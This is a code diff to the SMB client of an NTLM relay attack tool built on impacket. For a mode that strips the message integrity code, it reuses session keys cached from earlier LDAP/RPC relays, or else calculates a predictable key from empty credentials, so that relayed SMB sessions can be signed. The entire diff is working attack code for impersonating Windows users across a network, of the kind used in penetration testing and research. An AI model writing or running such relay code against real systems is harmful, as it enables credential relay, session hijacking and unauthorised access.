@@ -798,13 +798,31 @@ class SMBRelayClient(ProtocolClient):
             self.session._SMBConnection.set_session_key(signingKey)
         else:
             LOG.debug('[SMB] sendAuth: No signing key available, session will operate without signing')
-            # For --remove-mic-partial with NON_NT_SESSION_KEY flag, calculate predictable session key
+            # For --remove-mic-partial with NON_NT_SESSION_KEY flag, use cached or calculate session key
             if self.serverConfig.remove_mic_partial:
-                # With NTLMSSP_REQUEST_NON_NT_SESSION_KEY and empty credentials (LOCAL_CALL),
-                # the session key is: LMOWFv1('', '')[:8] + b'\x00'*8
-                from impacket.ntlm import LMOWFv1
-                calculated_key = LMOWFv1('', '')[:8] + b'\x00'*8
-                LOG.debug('[SMB] sendAuth: Calculated session key for NON_NT_SESSION_KEY with empty credentials: %s' % calculated_key.hex())
+                # Try to get cached session key from previous LDAP/RPC relay
+                from impacket.ntlm import LMOWFv1, NTLMAuthChallengeResponse
+
+                # Parse username/domain from auth message to build cache key
+                try:
+                    auth_msg = NTLMAuthChallengeResponse()
+                    auth_msg.fromString(authData)
+                    username = auth_msg['user_name'].decode('utf-16le') if auth_msg['user_name'] else ''
+                    domain = auth_msg['domain_name'].decode('utf-16le') if auth_msg['domain_name'] else ''
+                    cache_key = f"{domain}\\{username}@{self.targetHost}".lower()
+
+                    if cache_key in self.serverConfig.session_key_cache:
+                        calculated_key = self.serverConfig.session_key_cache[cache_key]
+                        LOG.info('[SMB] sendAuth: Using CACHED session key from previous relay: %s' % calculated_key.hex())
+                    else:
+                        # With NTLMSSP_REQUEST_NON_NT_SESSION_KEY and empty credentials (LOCAL_CALL),
+                        # the session key is: LMOWFv1('', '')[:8] + b'\x00'*8
+                        calculated_key = LMOWFv1('', '')[:8] + b'\x00'*8
+                        LOG.debug('[SMB] sendAuth: Calculated session key for NON_NT_SESSION_KEY with empty credentials: %s' % calculated_key.hex())
+                except Exception as e:
+                    LOG.debug('[SMB] sendAuth: Error checking cache, using calculated key: %s' % str(e))
+                    calculated_key = LMOWFv1('', '')[:8] + b'\x00'*8
+
                 self.session._SMBConnection.set_session_key(calculated_key)
 
         return token, errorCode
